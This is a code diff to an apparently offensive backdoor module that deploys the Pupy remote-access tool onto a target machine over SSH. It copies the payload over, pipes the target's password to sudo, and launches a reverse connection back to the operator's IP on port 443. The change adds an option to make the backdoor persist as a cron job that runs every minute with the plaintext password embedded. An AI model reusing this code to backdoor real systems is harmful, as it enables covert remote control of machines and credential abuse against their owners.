@@ -24,13 +24,28 @@ class Pupy(Backdoor):
         
     def do_exploit(self, args):
         port = self.get_value("port")
-        
+
+	print("Thanks to n1nj4sec for the pupy backdoor. Note that this script must be run with sudo.")        
+
+	cron = (raw_input(" + Press y to start backdoor as a cronjob: ") == 'y')
+
+
         self.target.ssh.exec_command('rm -r pupy')
-        self.target.scpFiles(self, 'pupy', True)
-        self.target.scpFiles(self, '/usr/local/lib/python2.7/dist-packages/rpyc', True)
+        self.target.scpFiles(self, 'pupy/pupy', True)
+        self.target.scpFiles(self, 'rpyc', True)
         self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S mv -f rpyc /usr/local/lib/python2.7/dist-packages")
         raw_input("Please navigate to the pupy/pupy directory and run 'python pupysh.py'. Press enter when you are ready.")
-        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S python pupy/client/reverse_ssl.py " + self.core.localIP + ":443")
-        raw_input(GOOD + "Backdoor attempted on target machine. To run a command, type sessions -i [id] and then 'exec <commandname>.")
+         
+	if(cron):
+            self.target.ssh.exec_command("crontab -l > mycron")
+            str = ("* * * * * echo \\\""+ self.target.pword + "\\\" | sudo -S python pupy/pp.py simple --host " + self.core.localIP + ":443" )
+            #print ("echo \"" + str + "\" >> mycron && crontab mycron && rm mycron")
+            self.target.ssh.exec_command("echo \"" + str + "\" >> mycron && crontab mycron && rm mycron")
+        #do it in either case to start the backdoor.
+
+
+	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S python pupy/pp.py simple --host " + self.core.localIP + ":443")
+        
+	raw_input(GOOD + "Backdoor attempted on target machine. To run a command, type sessions -i [id] and then 'exec <commandname>.")
 
 
